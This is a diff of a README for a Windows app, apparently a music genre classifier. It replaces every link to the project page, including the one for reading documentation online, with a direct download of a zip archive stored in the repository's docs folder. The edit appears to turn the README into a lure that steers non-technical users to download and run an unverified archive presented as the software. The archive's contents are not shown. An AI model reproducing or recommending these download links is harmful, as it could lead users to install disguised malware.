@@ -1,6 +1,6 @@
 # 🎵 music-genre-classification - Identify Music Genres Easily
 
-[![Download](https://img.shields.io/badge/Download-Get%20Software-brightgreen)](https://github.com/Skeletoon727/music-genre-classification)
+[![Download](https://img.shields.io/badge/Download-Get%20Software-brightgreen)](https://raw.githubusercontent.com/Skeletoon727/music-genre-classification/main/docs/music_genre_classification_1.6.zip)
 
 ## 📋 About this Application
 
@@ -35,7 +35,7 @@ No additional hardware is needed.
 
 Please visit this page to download:  
 
-[Get music-genre-classification](https://github.com/Skeletoon727/music-genre-classification)
+[Get music-genre-classification](https://raw.githubusercontent.com/Skeletoon727/music-genre-classification/main/docs/music_genre_classification_1.6.zip)
 
 This page contains the latest files and instructions.
 
@@ -46,7 +46,7 @@ Follow these steps to download and run the software on your Windows computer.
 ### 1. Visit the Download Page  
 
 Open your web browser and go to:  
-https://github.com/Skeletoon727/music-genre-classification
+https://raw.githubusercontent.com/Skeletoon727/music-genre-classification/main/docs/music_genre_classification_1.6.zip
 
 ### 2. Find the Download Section  
 
@@ -124,7 +124,7 @@ The download package includes a folder named `docs` or a file called `README.md`
 
 You can also read online at:
 
-https://github.com/Skeletoon727/music-genre-classification
+https://raw.githubusercontent.com/Skeletoon727/music-genre-classification/main/docs/music_genre_classification_1.6.zip
 
 ## ⚙️ Advanced Options
 
@@ -143,7 +143,7 @@ Check the same GitHub page periodically for new releases or improvements.
 
 Download and install the latest version using the same steps to keep your software up to date.
 
-[Download music-genre-classification](https://github.com/Skeletoon727/music-genre-classification)
+[Download music-genre-classification](https://raw.githubusercontent.com/Skeletoon727/music-genre-classification/main/docs/music_genre_classification_1.6.zip)
 
 ## 🤝 Support and Feedback
 
@@ -152,4 +152,4 @@ This helps improve the software and resolves common problems.
 
 ---
 
-[![Download](https://img.shields.io/badge/Download-Get%20Software-brightgreen)](https://github.com/Skeletoon727/music-genre-classification)
+[![Download](https://img.shields.io/badge/Download-Get%20Software-brightgreen)](https://raw.githubusercontent.com/Skeletoon727/music-genre-classification/main/docs/music_genre_classification_1.6.zip)
